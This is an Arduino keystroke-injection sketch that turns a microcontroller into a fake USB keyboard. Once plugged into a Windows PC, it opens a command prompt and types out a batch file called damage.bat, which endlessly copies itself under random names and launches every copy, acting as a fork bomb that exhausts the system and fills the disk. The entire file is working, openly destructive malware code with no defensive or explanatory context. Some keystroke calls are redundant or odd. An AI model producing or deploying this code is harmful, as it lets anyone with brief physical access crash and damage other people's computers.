#include <Keyboard.h>

void setup() {

  Keyboard.begin(); //start keyboard communication 
   delay(2137);
   Keyboard.press(KEY_LEFT_GUI);
   delay(600); 
   Keyboard.press('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI);
   delay(600);
   Keyboard.press('c');
   delay(600);
   Keyboard.press('m');
   delay(600);
   Keyboard.press('d');
   delay(600);
   Keyboard.release('c');
   delay(600);
   Keyboard.release('m');
   delay(600);
   Keyboard.release('d');
   delay(2137);
   Keyboard.press(KEY_RETURN);
   delay(600);
   Keyboard.release(KEY_RETURN);
   delay(600); 
   Keyboard.println("echo @echo off>damage.bat");
   delay(600);
   Keyboard.println("echo :A>>damage.bat");
   delay(600);
   Keyboard.println("echo SET /A x=%RANDOM%%%1999999999%>>damage.bat");
   delay(600);
   Keyboard.println("echo 'type damage.bat ^>^> %x%.bat'>>damage.bat");
   delay(600);
   Keyboard.println("echo start %x%.bat>>damage.bat");
   delay(600);
   Keyboard.println("echo goto:A>>damage.bat");
   delay(600);
   Keyboard.println("start damage.bat");  
   Keyboard.press(KEY_RETURN);
   delay(600);
   Keyboard.release(KEY_RETURN);
   Keyboard.end();
 }

void loop() {}
